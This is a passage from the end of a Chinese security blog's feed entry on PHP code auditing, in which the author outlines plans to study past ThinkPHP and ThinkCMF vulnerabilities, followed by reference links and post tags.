绑定，phpstorm 调试分析，总之，能学到东西就行。学到了思路，下一步就是复现thinkphp 的历史漏洞，和thinkcmf 或者其他php框架的历史漏洞，学习完之后就去找cms进行实战！（其实这个已经搁置了快半年了。</p><blockquote><p>一个不能孜孜不倦，始终处于新知识、新技术学习状态下的安全爱好者，必然会被超越和取代。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;参考资料：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://v0w.top/2020/08/26/CodeAudit-php/&quot;&gt;代码审计常见的三种方法（PHP篇）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.sqlsec.co</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="漏洞挖掘" scheme="https://hack-for.fun/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
</feed>
